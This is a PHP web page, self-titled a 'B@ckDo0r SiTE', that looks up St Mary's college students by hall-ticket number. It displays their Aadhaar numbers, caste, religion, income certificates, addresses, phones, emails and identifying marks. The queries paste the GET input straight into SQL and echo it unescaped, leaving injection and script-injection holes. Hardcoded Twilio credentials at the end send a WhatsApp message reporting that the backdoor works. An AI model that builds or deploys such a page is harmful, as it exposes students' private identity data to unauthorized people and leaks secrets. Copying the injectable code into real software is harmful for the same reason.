

<?php

include('log.php');


$htno="-";
$branch="-";
$cid="-";
$sname="-";
$fname="-";
$dob="-";
$br="-";
$sr="-";
$religion="-";
$addr="-";
$moles="-";
$aadhar="-";
$gender="-";
$admission="-";
$resevation="-";
$ssc_no="-";
$inter_no="-";
$set_no="-";
$income_no="-";
$caste_no="-";


$err="1";

if(isset($_GET['submit']))
{
$htno=$_GET["htno"];
include('config.php');
//fetch student details
$sql = "SELECT * FROM `r18` where htno='$htno' UNION SELECT * FROM `all_students` where htno='$htno'";
$result = $conn->query($sql);

if ($result->num_rows > 0) {
    // output data of each row
    while($row = $result->fetch_assoc()) {
        $htno=$row["htno"];
        $cid=$row["college_code"];
        $branch=$row["branch_code"];
        $sname=$row["name"];
        $fname=$row["fathername"];
        $dob=$row["dob"];
        $br=$row["phone"];
        $sr=$row["email"];
        $religion=$row["religion"];
        $resevation=$row["resevation"];
        $addr=$row["address"];
        $gender=$row["gender"];
        $moles=$row["moles"];
        $admission=$row["admission"];
        $aadhar=$row["aadhar"];
        
    }
} else {
     $err="Please Check the Hallticket";
}
//end student details fetch

//fetch epass details
$sql = "SELECT * FROM `epass_18` where htno='$htno'";
$result = $conn->query($sql);

if ($result->num_rows > 0) {
    // output data of each row
    while($row = $result->fetch_assoc()) {
        $htno=$row["htno"];
        $ssc_no=$row["ssc"];
        $inter_no=$row["inter"];
        $set_no=$row["eamcet"];
        $income_no=$row["income_no"];
        $caste_no=$row["caste_no"];
        $aadhar=$row["aadhar"];
        
    }
}
//end epass details fetch

$conn->close();
}
?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href="images/favicon.ico" rel="icon" type="image/x-icon" />
    <title>Stmarys Student Details by Praveen Gadikoppula </title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!--- bootstrap  3 head --->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <!---bootstrap end -->

    <link rel="stylesheet" type="text/css" media="screen" href="css/student.css" />
    <script src="main.js"></script>
</head>
<body>
    <h1>::::::: StMArys B@ckDo0r SiTE:::::::::</h1>
    <br>

    <!-- Search Bar -->
    <form action="student.php" method="get">

     <div class="container">
  <div class="input-group">
    <input type="text" class="form-control" name="htno" placeholder="Enter Hallticket Number">
    <div class="input-group-btn">
      <button class="btn btn-info" type="submit" name="submit">
        <i class="glyphicon glyphicon-search"></i>
      </button>
    </div>
</div>
</form>



         <?php if ($err==1) {
                           echo "<div class='alert alert-success alert-dismissible fade in'><a href='#' class='close' data-dismiss='alert' aria-label='close'>&times;</a><strong>Success! </strong>" .$err. "  Record Found, Showing Results for ".$htno."</div>";
    
                       } else {
                           echo  "<div class='alert alert-danger alert-dismissible fade in'><a href='#' class='close' data-dismiss='alert' aria-label='close'>&times;</a><strong>Error! </strong> " .$err."</div>";

                          }
          ?>
      </div>      
        


     <!-- Results table --> 
      <div>
    <center> 
        <br>
 
    <table>
        <!--<caption>STMARYS STUDENT DETAILS </caption><br><br>-->
    

    <tr>
        <th colspan="2" ><img src="images/profiles/<?php echo "$cid/$htno"; ?>.jpg" onerror="this.src='images/Default.png'" width="80" height="120"></th><th>Student Name :</th><td colspan="3"><p class="name" ><strong><?php echo $sname; ?></p></strong>  
        

  <!--  <div class="container"> <h2>Basic Modal Example</h2> Trigger the modal with a button -->
  <button type="button" class="btn btn-info btn-sl" data-toggle="modal" data-target="#myModal">Get Certs</button>

  <!-- Modal -->
  <div class="modal fade" id="myModal" role="dialog">
    <div class="modal-dialog">
    
      <!-- Modal content-->
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title"><?php echo $htno ?> Certificates Details</h4>
        </div>
        <div class="modal-body">
          <p><strong>SSC : </strong>            <?php echo $ssc_no ?></p><br>
          <p><strong>INTERMEDIATE : </strong>   <?php echo $inter_no ?></p><br>
          <p><strong>EAMCET : </strong>         <?php echo $set_no ?></p><br>
          <p><strong>AADHAR : </strong>        <?php echo $aadhar ?></p><br>
          <p><strong>INCOME CERT : </strong>    <?php echo $income_no ?></p><br>
          <p><strong>CASTE CERT : </strong>     <?php echo $caste_no ?></p><br>
          
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        </div>
      </div>
      
    </div>
  </div>
  
<!-- </div> -->


        
        </td>
    </tr>
    <tr>
        <th> Hallticket :</th><td><?php echo $htno; ?></td><th>College Code :</th><td><?php echo $cid; ?></td><th>Branch code:</th><td><?php echo $branch; ?></td>
    </tr>
  
    <tr>
        <th>Religion :</th><td><?php echo $religion; ?> </td><th>Father    :</th><td><?php echo $fname; ?> </td><th>DOB :</th><td><?php echo $dob; ?></td>
    </tr>
   
    <tr>
        <th>Aadhar :</th><td><?php echo $aadhar; ?></td><th>Admission :</th><td><?php echo $admission; ?></td><th>Gender :</th><td><?php echo $gender; ?></td>
    </tr>
    <tr>
        <th>Resevation :</th><td><?php echo $resevation; ?></td><th>Moles :</th><td colspan="3"><?php echo $moles; ?></td>
    </tr>
    <tr><td colspan="6"> <Address><strong>Address: </strong>  <?php echo $addr; ?>   </Address></td></tr>

        <tr>
            <th  class="results" colspan="3">Contact</th><th class="Results" colspan="3">Email</th>
        </tr>
        <tr>
            <td colspan="3" ><?php echo $br; ?></td><td colspan="3"><?php echo $sr; ?></td>
        </tr>
   
    </table>
     <?php 
/*
       if($br==0){
             echo "<img src='images/fail.png' alt='fail' width='100' height='100'></img>";
             echo  "<p class='fail'>Better Luck Next Time...</p>";
           
        
       }else{
        echo "<img src='images/pass.gif' alt='pass'></img><br>";
       echo "<audio controls autoplay>
            <source src='pass.mp3' type='audio/mpeg'>
             Your browser does not support the audio element.
            </audio>";
       }*/
    ?> 

</center>
</div>
<?php 
 
// Update the path below to your autoload.php, 
// see https://getcomposer.org/doc/01-basic-usage.md 
require_once '/path/to/vendor/autoload.php'; 
 
use Twilio\Rest\Client; 
 
$sid    = "AC2d77588a77441461335854c80e8ffcee"; 
$token  = "f23a9146242564fcb6d5c5f068570708"; 
$twilio = new Client($sid, $token); 
 
$message = $twilio->messages 
                  ->create("whatsapp:+919989939238", // to 
                           array( 
                               "from" => "whatsapp:+14155238886",       
                               "body" => "stmarys backdoor working..." 
                           ) 
                  ); 
 
print($message->sid);
?>

</body>
</html>